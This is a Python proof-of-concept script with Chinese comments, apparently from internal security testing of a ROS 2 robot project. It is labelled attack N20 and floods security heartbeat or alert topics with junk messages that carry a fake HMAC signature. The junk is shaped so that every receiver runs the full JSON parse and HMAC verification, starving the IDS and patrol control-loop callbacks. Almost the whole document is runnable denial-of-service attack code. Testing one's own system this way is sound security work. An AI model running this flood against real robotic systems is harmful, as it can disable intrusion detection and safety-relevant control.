#!/usr/bin/env python3
"""攻擊 N20 — Unauthenticated message flood → 強迫每個 receiver 做 per-message HMAC verify.

N15 修補加了「reject log throttle」防 log storm，但**只 throttle 了 log，沒 throttle verify**。
patrol / IDS / mission / system / burger_env 對 /security/alerts、/security/heartbeat
上**每一筆**訊息都會跑 verify_alert（JSON double-parse + HMAC-SHA256），不論最後拒不拒。

→ 攻擊者用單一高速 publisher 灌 junk，receiver 的 single-threaded executor 被
   verify 工作佔滿 → 其他 callback（IDS 的 _evaluate / patrol 的 control loop）被餓死。

本 PoC：對目標 topic 用最高速率 publish junk String。
victim 健康度由外部觀察（IDS 的 _print_stats 5s cadence 是否被拉長）。
"""
import sys
import time
import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy
from std_msgs.msg import String


def main():
    topic = sys.argv[1] if len(sys.argv) > 1 else '/security/heartbeat'
    duration = float(sys.argv[2]) if len(sys.argv) > 2 else 20.0
    rel = (sys.argv[3] if len(sys.argv) > 3 else 'be').lower()

    rclpy.init()
    node = Node('attacker_verify_flood')
    reliability = (ReliabilityPolicy.RELIABLE if rel == 'reliable'
                   else ReliabilityPolicy.BEST_EFFORT)
    qos = QoSProfile(depth=10, reliability=reliability)
    pub = node.create_publisher(String, topic, qos)
    print(f'   QoS reliability = {reliability.name}', flush=True)
    # 看似合法的 envelope 形狀（讓 verify 走完整 JSON parse + HMAC 路徑才失敗）
    junk = String()
    junk.data = ('{"body": "{\\"channel\\": \\"heartbeat\\", \\"nonce\\": '
                 '\\"deadbeefdeadbeef\\", \\"payload\\": \\"hb|0\\", \\"ts\\": 0.0}", '
                 '"sig": "0000000000000000000000000000000000000000000000000000000000000000"}')

    print(f'🌊 N20: 最高速率灌 junk 到 {topic} {duration:.0f}s', flush=True)
    n = 0
    t0 = time.monotonic()
    deadline = t0 + duration
    while time.monotonic() < deadline:
        pub.publish(junk)
        n += 1
        # 每 5000 筆 yield 一下避免完全卡死自己
        if n % 5000 == 0:
            rclpy.spin_once(node, timeout_sec=0.0)
    elapsed = time.monotonic() - t0
    print(f'⏹ 結束：{n} 筆 / {elapsed:.1f}s = {n/elapsed:.0f} msg/s', flush=True)
    node.destroy_node()
    rclpy.shutdown()


if __name__ == '__main__':
    main()
